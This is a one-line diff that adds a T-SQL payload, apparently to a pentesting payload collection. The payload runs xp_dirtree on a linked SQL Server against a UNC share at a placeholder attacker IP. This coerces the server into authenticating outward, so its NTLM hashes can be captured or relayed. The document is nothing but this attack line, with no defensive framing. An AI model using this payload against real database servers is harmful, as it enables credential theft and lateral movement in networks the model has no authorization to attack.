@@ -1,0 +1,1 @@
+EXECUTE ('master.sys.xp_dirtree "\\192.168.X.Y\a"') AT LINKED-SERVER
